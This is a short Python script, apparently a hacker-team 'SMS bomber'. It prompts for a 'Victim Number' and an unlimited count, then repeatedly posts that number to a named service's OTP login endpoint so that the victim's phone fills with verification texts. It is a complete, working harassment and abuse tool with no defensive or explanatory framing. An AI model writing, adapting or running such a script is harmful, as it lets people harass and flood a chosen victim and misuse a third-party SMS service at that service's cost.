red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

#imports

import os
import time
import sys
import requests
from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
#print(

acl='\033[1;30m'
rcl='\033[1;31m'
ycl='\033[1;33m'
ncl='\033[0;00m'


def clr():
    os.system("clear")


clr()
number=str(input(ycl+"\nEnter Your Victim Number "+acl+"[EX: 017xxxxxxx] "+ycl+"==>"))
amount=int(input(ycl+"\nEnter Your Amount : "+acl+"[Max: Unlimited ! "+ycl+"==>"))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number

for j in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(j+1)+ncl+" 💥 SMS - Bomb By CLAY Hacker Team 💥")
time.sleep(5)
print(blue+"\n\t Wait For Bombing Attack  ")